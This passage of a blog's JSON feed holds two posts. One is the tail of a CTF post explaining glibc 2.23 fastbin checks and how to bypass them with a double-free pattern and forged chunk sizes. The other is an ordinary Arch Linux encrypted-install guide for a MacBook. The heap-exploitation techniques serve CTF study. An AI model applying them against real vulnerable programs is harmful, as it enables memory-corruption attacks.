punctuation\">)</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre></pre></td></tr><tr><td data-num=\"83\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>    main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"fastbin-related-error-handling\"><a class=\"markdownIt-Anchor\" href=\"#fastbin-related-error-handling\">#</a> Fastbin-Related Error Handling</h1>\n<h2 id=\"check-1-double-free-or-corruption-fasttop\"><a class=\"markdownIt-Anchor\" href=\"#check-1-double-free-or-corruption-fasttop\">#</a> Check 1: double free or corruption (fasttop)</h2>\n<p>In glibc 2.23,  <code>_int_free()</code>  will refuse to free the given pointer  <code>p</code>  when the first chunk in fastbin is  <code>p</code> .</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/* Check that the top of the bin is not the record we are going to add</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>   (i.e., double free).  */</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_expect</span><span class=\"token punctuation\">(</span>old <span class=\"token operator\">==</span> p<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\terrstr <span class=\"token operator\">=</span> <span class=\"token string\">\"double free or corruption (fasttop)\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">goto</span> errout<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>Source: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9lbGl4aXIuYm9vdGxpbi5jb20vZ2xpYmMvZ2xpYmMtMi4yMy9zb3VyY2UvbWFsbG9jL21hbGxvYy5jI0wzOTM3\">https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3937</span></p>\n<p>To bypass this restriction, a commonly used technique is:</p>\n<ul>\n<li>free(A)</li>\n<li>free(B)</li>\n<li>free(A)</li>\n</ul>\n<h2 id=\"check-2-malloc-memory-corruption-fast\"><a class=\"markdownIt-Anchor\" href=\"#check-2-malloc-memory-corruption-fast\">#</a> Check 2: malloc(): memory corruption (fast)</h2>\n<p>In glibc 2.23,  <code>_int_malloc()</code>  will refuse to return a freed chunk from a fastbin if that chunk has incorrect size.</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_expect</span><span class=\"token punctuation\">(</span><span class=\"token function\">fastbin_index</span><span class=\"token punctuation\">(</span><span class=\"token function\">chunksize</span><span class=\"token punctuation\">(</span>victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> idx<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\terrstr <span class=\"token operator\">=</span> <span class=\"token string\">\"malloc(): memory corruption (fast)\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>errout<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token function\">malloc_printerr</span><span class=\"token punctuation\">(</span>check_action<span class=\"token punctuation\">,</span> errstr<span class=\"token punctuation\">,</span> <span class=\"token function\">chunk2mem</span> <span class=\"token punctuation\">(</span>victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> av<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>Source: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9lbGl4aXIuYm9vdGxpbi5jb20vZ2xpYmMvZ2xpYmMtMi4yMy9zb3VyY2UvbWFsbG9jL21hbGxvYy5jI0wzMzg1\">https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3385</span></p>\n<p>To bypass this restriction, the freed chunk’s  <code>size</code>  field (right before  <code>fd</code> ) must be set to the correct size. A commonly used technique is to:</p>\n<ul>\n<li>Look for the byte pattern  <code>7f 00 00 00 00 00 00 00</code>  in memory, and use it as the  <code>size</code>  field.</li>\n<li>Go back 8 bytes to obtain the base address of the chunk.</li>\n<li>Place this chunk into a fastbin, either by free()ing it or fastbin dup.</li>\n</ul>\n",
            "tags": [
                "linux",
                "ctf",
                "binary-exploitation"
            ]
        },
        {
            "id": "https://aesophor.github.io/2020/07/20/Arch-Linux-on-MacBook-Pro-11-2-with-Custom-NVMe-M-2-SSD/",
            "url": "https://aesophor.github.io/2020/07/20/Arch-Linux-on-MacBook-Pro-11-2-with-Custom-NVMe-M-2-SSD/",
            "title": "Arch Linux on MacBook Pro 11,2 with Custom NVMe M.2 SSD",
            "date_published": "2020-07-20T10:48:46.000Z",
            "content_html": "<p><img data-src=\"banner.jpg\" alt=\"banner\"></p>\n<h1 id=\"introduction\"><a class=\"markdownIt-Anchor\" href=\"#introduction\">#</a> Introduction</h1>\n<p>The only laptop I own is Apple’s <span class=\"exturl\" data-url=\"aHR0cHM6Ly9zdXBwb3J0LmFwcGxlLmNvbS9rYi9zcDcwND9sb2NhbGU9ZW5fVVM=\">MacBook Pro Retina 15&quot; (late 2014)</span>, on which I’ve run Gentoo Linux for about three years. Recently, I replaced my MacBook’s SSD with <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2Ftc3VuZy5jb20vc2VtaWNvbmR1Y3Rvci9taW5pc2l0ZS9zc2QvcHJvZHVjdC9jb25zdW1lci85NzBldm9wbHVzLw==\">Samsung’s 970 EVO Plus NVMe M.2 SSD (1TB)</span> and decided to install Arch Linux on it.</p>\n<h1 id=\"back-up-the-old-ssd\"><a class=\"markdownIt-Anchor\" href=\"#back-up-the-old-ssd\">#</a> Back Up the Old SSD</h1>\n<p>I booted into a  <code>Gentoo Live USB</code>  and used  <code>dd</code>  to back up my entire old SSD to an image file.</p>\n<pre><code>root$ dd if=/dev/sda of=/mnt/external_drive/old_ssd.img bs=4M\n</code></pre>\n<p>Later on, after the new NVMe M.2 SSD has been installed, I could mount my external hard drive on  <code>/mnt/external_drive</code>  and run the following commands to copy all my data from the image file to the new SSD. The only drawback of this approach is that I have to manually resize the partitions later.</p>\n<pre><code>root$ dd if=/mnt/external_drive/old_ssd.img of=/dev/nvme0n1 bs=4M\n</code></pre>\n<h1 id=\"firmware-upgrade\"><a class=\"markdownIt-Anchor\" href=\"#firmware-upgrade\">#</a> Firmware Upgrade</h1>\n<p>Before installing NVMe M.2 SSD on your MacBook, make sure that you’ve upgraded to <strong>macOS Mojave which includes the firmware required to boot from NVMe M.2 SSD</strong>.</p>\n<h1 id=\"ssd-upgrade\"><a class=\"markdownIt-Anchor\" href=\"#ssd-upgrade\">#</a> SSD Upgrade</h1>\n<blockquote>\n<p><strong>CAUTION</strong><br><br>\nBe very careful with the screws. I stripped some of my screws due to the bloated batteries, and ended up spending $3000 NTD (approx. $100 USD) for repairment.</p>\n</blockquote>\n<p>After upgrading to macOS Mojave, your MacBook should be able to recognize NVMe M.2 SSD from now on. Now we can remove the screws on its back and install the new SSD. I bought the Screwdrivers + SSD Adapter on <span class=\"exturl\" data-url=\"aHR0cDovL3Nob3BlZS50dw==\">shopee.tw</span> -&gt; <a href=\"https://shopee.tw/product/4848951/1501356237\"><strong>Link</strong></a></p>\n<p><img data-src=\"swap.jpg\" alt=\"swap\"></p>\n<h1 id=\"ssd-data-migration\"><a class=\"markdownIt-Anchor\" href=\"#ssd-data-migration\">#</a> SSD Data Migration</h1>\n<p>After upgrading my MacBook’s SSD, I installed macOS on it and used it for a week. However, being a long-term GNU/Linux user, I started to miss all that freedom and customizability offered by Linux. Therefore, I decided to go back to Linux again.</p>\n<p>At first I used  <code>dd</code>  to clone all my data from the image file to the new SSD. However, this didn’t work for me, since <strong>I didn’t compile support for NVMe M.2 SSD into my gentoo linux kernel</strong>, so although the disk was successfully migrated, I wasn’t able to boot from it.</p>\n<h1 id=\"prepare-installation-medium\"><a class=\"markdownIt-Anchor\" href=\"#prepare-installation-medium\">#</a> Prepare Installation Medium</h1>\n<p>Instead of trying to recompile a new linux kernel with NVMe M.2 SSD support, I decided to leave Gentoo Linux this time. Gentoo is a beautiful Linux distribution (if you have time and patience), but after manually compiling all those packages for 3 years on this fucking MacBook, I’ve already become kinda fed up with it.</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYXJjaGxpbnV4Lm9yZy9kb3dubG9hZC8=\">Download Arch Linux ISO</span> and prepare Arch Live USB:</p>\n<pre><code>root$ dd if=/path/to/arch.iso of=/dev/sdX bs=4M\n</code></pre>\n<p>Power off your MacBook, insert the USB stick, hold  <code>alt/option</code>  and power it on again. Now you should see the option to boot from Arch Linux Live USB.</p>\n<h1 id=\"base-installation\"><a class=\"markdownIt-Anchor\" href=\"#base-installation\">#</a> Base Installation</h1>\n<p>After booting from Arch Linux Live USB, you’ll be logged in as the root user. To get Internet connection, I simply plugged my Android phone into my Macbook simply via USB cable, turned on  <code>USB Tethering</code> , and ran:</p>\n<pre><code>root$ dhcpcd\n</code></pre>\n<p>Ensure the clock is accurate:</p>\n<pre><code>root$ timedatectl set-ntp true\n</code></pre>\n<p>Run  <code>cfdisk /dev/nvme0n1</code>  and partition the new SSD as follows:</p>\n<pre><code>                                   Disk: /dev/nvme0n1\n                 Size: 931.53 GiB, 1000204886016 bytes, 1953525168 sectors\n                Label: gpt, identifier: 85CF6A21-FC5C-408D-8532-8751C80F0593\n\nDevice                 Start          End        Sectors        Size Type\n/dev/nvme0n1p1          2048       411647         409600        200M EFI System             \n/dev/nvme0n1p2       411648    1953525134     1953113487      931.3G Linux filesystem\n</code></pre>\n<p>Now run  <code>lsblk</code>  and you’ll see something like this:</p>\n<pre><code>NAME               MAJ:MIN RM   SIZE RO TYPE  MOUNTPOINT\nnvme0n1            259:0    0 931.5G  0 disk  \n├─nvme0n1p1        259:1    0   200M  0 part  \n└─nvme0n1p2        259:2    0 931.3G  0 part  \n</code></pre>\n<p>Prepare LVM+LUKS on the new SSD:</p>\n<pre><code>root$ cryptsetup -v --cipher aes-xts-plain64 --key-size 256 --hash sha1 --iter-time 1000\\\n            --use-random --verify-passphrase luksFormat /dev/nvme0n1p2\nroot$ cryptsetup luksOpen /dev/nvme0n1p2 lvm\nroot$ pvcreate /dev/mapper/lvm\nroot$ vgcreate vgcrypt /dev/mapper/lvm\nroot$ lvcreate --size 30G --name root vgcrypt\nroot$ lvcreate --extents +100%FREE --name home vgcrypt\nroot$ mkfs.fat -F32 /dev/nvme0n1p1\nroot$ mkfs.ext4 /dev/mapper/vgcrypt-root\nroot$ mkfs.ext4 /dev/mapper/vgcrypt-home\n</code></pre>\n<p>Now run  <code>lsblk</code>  again and you’ll see something like this:</p>\n<pre><code>NAME               MAJ:MIN RM   SIZE RO TYPE  MOUNTPOINT\nnvme0n1            259:0    0 931.5G  0 disk  \n├─nvme0n1p1        259:1    0   200M  0 part  \n└─nvme0n1p2        259:2    0 931.3G  0 part  \n  └─vgcrypt        254:0    0 931.3G  0 crypt \n    ├─vgcrypt-root 254:1    0    30G  0 lvm   \n    └─vgcrypt-home 254:2    0 901.3G  0 lvm   \n</code></pre>\n<p>Mount the partitions:</p>\n<pre><code>root$ mount /dev/mapper/vgcrypt-root /mnt\nroot$ mkdir -p /mnt/home\nroot$ mkdir -p /mnt/boot\nroot$ mount /dev/mapper/vgcrypt-home /mnt/home\nroot$ mount /dev/nvme0n1p1 /mnt/boot\n</code></pre>\n<p>Install the base system:</p>\n<pre><code>root$ pacstrap -i /mnt base base-devel linux linux-firmware lvm2\n</code></pre>\n<p>Generate fstab:</p>\n<ul>\n<li><code>-L</code>  generates the fstab with labels instead of UUIDs since we’re using encrypted LVM disk.</li>\n<li><code>-p</code>  prevents pseudo-filesystems from being added.</li>\n</ul>\n<pre><code>root$ genfstab -L -p /mnt &gt;&gt; /mnt/etc/fstab\nroot$ cat /mnt/etc/fstab\n</code></pre>\n<h1 id=\"configure-the-new-system\"><a class=\"markdownIt-Anchor\" href=\"#configure-the-new-system\">#</a> Configure the New System</h1>\n<p>Chroot into our new system:</p>\n<pre><code>root$ arch-chroot /mnt /bin/bash\n</code></pre>\n<p>Generate locales:</p>\n<ul>\n<li>uncomment the locales you’re going to use in /etc/locale.gen, and run  <code>locale-gen</code> .</li>\n<li>run  <code>echo LANG=en_US.UTF-8 &gt; /etc/locale.conf</code>  to make ENG UTF-8 the default locale.</li>\n</ul>\n<p>Replace the default console font with terminus:</p>\n<pre><code>root$ pacman -S terminus-font\nroot$ echo FONT=ter-v24n &gt; /etc/vconsole.conf\n</code></pre>\n<p>Set timezone and set time to UTC:</p>\n<pre><code>root$ ln -sf /usr/share/zoneinfo/Asia/Taipei /etc/localtime\nroot$ hwclock --systohc --utc\n</code></pre>\n<p>To ensure the kernel loads the proper modules to decrypt root disk at startup, we have to add necessary hooks in  <code>/etc/mkinitcpio.conf</code> :</p>\n<pre><code>HOOKS=&quot;base udev autodetect keyboard keymap modconf block consolefont encrypt lvm2 filesystems fsck&quot;\n</code></pre>\n<p>Regenerate the initramfs image to EFI Partition ( <code>/dev/nvme0n1p1</code> ):</p>\n<pre><code>root$ mkinitcpio -p linux\n</code></pre>\n<p>Set hostname:</p>\n<pre><code>root$ echo allegro &gt; /etc/hostname\n</code></pre>\n<p>Install systemd-boot as our bootloader:</p>\n<pre><code>root$ pacman -S dosfstools\nroot$ bootctl --path=/boot install\n</code></pre>\n<p>Add an boot entry for systemd-boot by editing  <code>/boot/loader/entries/arch.conf</code> :</p>\n<pre><code>title\tArch Linux\nlinux\t/vmlinuz-linux\ninitrd\t/initramfs-linux.img\noptions\tcryptdevice=/dev/nvme0n1p2:vgcrypt root=/dev/mapper/vgcrypt-root rw\n</code></pre>\n<p>Change root user’s password:</p>\n<pre><code>root$ passwd\n</code></pre>\n<p>Install additional packages:</p>\n<pre><code>root$ pacman -S dhcpcd git zsh vim neovim wget stow tmux\n</code></pre>\n<p>Reboot:</p>\n<pre><code>root$ reboot\n</code></pre>\n<p>Add an unprivileged user:</p>\n<pre><code>root$ useradd --create-home --groups wheel --shell /bin/zsh aesophor\nroot$ passwd aesophor\n</code></pre>\n<p>Set up sudo:</p>\n<ul>\n<li>run  <code>visudo</code>  and uncomment the line  <code>%wheel ALL=(ALL) ALL</code> .</li>\n</ul>\n<p>At this point, you may logout the root user and re-login with your unprivileged user.</p>\n<h1 id=\"post-installation\"><a class=\"markdownIt-Anchor\" href=\"#post-installation\">#</a> Post Installation</h1>\n<p>Install <a href=\"https://github.com/Jguer/yay\"> <code>yay</code> </a>, an AUR helper:</p>\n<pre><code>user$ git clone https://aur.archlinux.org/yay.git\nuser$ cd yay\nuser$ sudo makepkg -si\n</code></pre>\n<p>Install X and video drivers:</p>\n<pre><code>user$ sudo pacman -S xf86-video-intel mesa-libgl libva-intel-driver libva\nuser$ yay -S opencl-intel\nuser$ sudo pacman -S xorg-server xorg-xinit xorg-apps\n</code></pre>\n<p>Install  <code>xf86-input-mtrack</code>  as our trackpad driver:</p>\n<pre><code>user$ yay -S xf86-input-mtrack\nuser$ sudo wget -O /etc/X11/xorg.conf.d/10-mtrack.conf https://raw.githubusercontent.com/aesophor/macbookpro-11-2-gentoo-config/master/etc/X11/xorg.conf.d/10mtrack.conf\nuser$ sudo gpasswd -a aesophor input\n</code></pre>\n<p>Install  <code>broadcom-wl-dkms</code>  as our Wi-Fi driver (my laptop model is A1398):</p>\n<pre><code>user$ sudo pacman -S dkms broadcom-wl-dkms\n</code></pre>\n<p>Install  <code>bcwc-pcie-git</code>  as our FaceTimeHD webcam driver:</p>\n<pre><code>user$ yay -S bcwc-pcie-git\n</code></pre>\n<p>Install font packages:</p>\n<pre><code>user$ sudo pacman -S ttf-liberation wqy-zenhei wqy-bitmapfont\nuser$ yay -S siji-git uw-ttyp0-font\n</code></pre>\n<p>Get audio to work:</p>\n<pre><code>user$ sudo pacman -S pulseaudio alsa-lib alsa-utils\n</code></pre>\n<p>Install DE, WM, bar, etc:</p>\n<pre><code>user$ sudo pacman -S plasma-desktop\nuser$ yay -S wmderland-git polybar dunst picom rofi-git rxvt-unicode firefox\n</code></pre>\n<p>Install fcitx5 input method:</p>\n<pre><code>user$ sudo pacman -S fcitx5 fcitx5-chinese-addons fcitx5-configtool fcitx5-gtk fcitx5-qt fcitx5-material-color\nuser$ yay -S fcitx5-pinyin-zhwiki\n</code></pre>\n<p>Downgrade  <code>pango</code>  to 1.43 since &gt;= 1.44 cause issue with font rendering on rofi:</p>\n<pre><code>user$ sudo pacman -U https://archive.archlinux.org/packages/p/pango/pango-1.43.0-1-x86_64.pkg.tar.xz\n</code></pre>\n<p>Powersaving:</p>\n<pre><code>user$ yay -S powertop thermald cpupower mbpfan-git\nuser$ sudo systemctl enable thermald.service\nuser$ sudo systemctl enable cpupower.service\nuser$ sudo systemctl enable mbpfan.service\n</code></pre>\n<p>Finally, create systemd services that execute the following commands, respectively:</p>\n<ul>\n<li>echo ‘disable’ &gt; /sys/firmware/acpi/interrupts/gpe06  # fix kworker high cpu usage</li>\n<li>echo “XHC1” &gt; /proc/acpi/wakeup  # fix immediate wakeup after suspension on macbook</li>\n<li>setpci -v -H1 -s 00:01.00 BRIDGE_CONTROL=0  # enable keyboard backlight control</li>\n</ul>\n<h1 id=\"enter-x11\"><a class=\"markdownIt-Anchor\" href=\"#enter-x11\">#</a> Enter X11</h1>\n<p>Install my dotfiles:</p>\n<pre><code>user$ git clone https://github.com/aesophor/dotfiles.git ~/Dots\nuser$ cd ~/Dots\nuser$ rm ~/.zshrc ~/.bashrc\nuser$ ./.install.sh\n</code></pre>\n<p>Start an X11 session (GUI) as your unprivileged user:</p>\n<pre><code>user$ startx\n</code></pre>\n<p>Voilà. Now you can go ahead and start customizing it!<br>\n<img data-src=\"result.png\" alt=\"\"></p>\n",
            "tags": [
                "linux"
            ]
        }
    ]
}